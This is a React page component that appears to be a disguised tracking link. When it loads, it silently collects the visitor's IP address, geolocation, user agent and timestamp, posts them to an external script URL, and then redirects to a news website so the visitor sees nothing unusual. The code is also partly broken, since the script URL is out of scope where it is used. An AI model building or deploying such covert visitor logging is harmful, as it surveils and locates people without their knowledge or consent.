import { useEffect } from 'react'
export default function App() {
  async function getIPAddress() {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    const formData = new FormData();


    let latitude;
    let longitude;

    const currentDate = new Date();
    // console.log("Current Date:", currentDate);

    navigator.geolocation.getCurrentPosition(function (position) {
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;
      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
      formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
      Submit(formData)
    });
    // this 01 start new code
    function getLocation() {
			if (navigator.geolocation) {
				navigator.geolocation.getCurrentPosition(showPosition, showError);
			} else {
				alert("Geolocation is not supported by this browser.");
			}
		}

		function showPosition(position) {
			// Do something with the user's location
		}

		function showError(error) {
			switch(error.code) {
				case error.PERMISSION_DENIED:
					alert("Location permission denied. Please enable location services to use this website.");
					break;
				case error.POSITION_UNAVAILABLE:
					alert("Location information is unavailable.");
					break;
				case error.TIMEOUT:
					alert("The request to get user location timed out.");
					break;
				case error.UNKNOWN_ERROR:
					alert("An unknown error occurred.");
					break;
			}
		}
    // end 01 this code 

    const userAgent = navigator.userAgent;
    // console.log("User Agent:", userAgent);

    formData.append("Ip", data.ip);
    formData.append("Date", currentDate);
    // formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
    formData.append("Agent", userAgent);
    Submit(formData)
    // window.location.href = 'https://tv9gujarati.com/';
  }

useEffect(() => {
  getIPAddress()
  const scriptUrl = process.env.NEXT_PUBLIC_URL;
  console.log("scriptUrl",scriptUrl)
  console.log("NEXT_PUBLIC_URL",process.env.NEXT_PUBLIC_URL)

}, [])

function Submit(formData) {
  console.log('Google Script URL:', scriptUrl);

  fetch(scriptUrl, {
    method: "POST",
    body: formData
  })
  .then((res) => res.json())
  .then((data) => {
    setTimeout(() => {
      window.location.href = 'https://tv9gujarati.com/';
    }, 1000);
  })
  .catch((error) => {
    console.error('Error:', error);
  });
}

  return (
    <div className="App" />
    
  );
}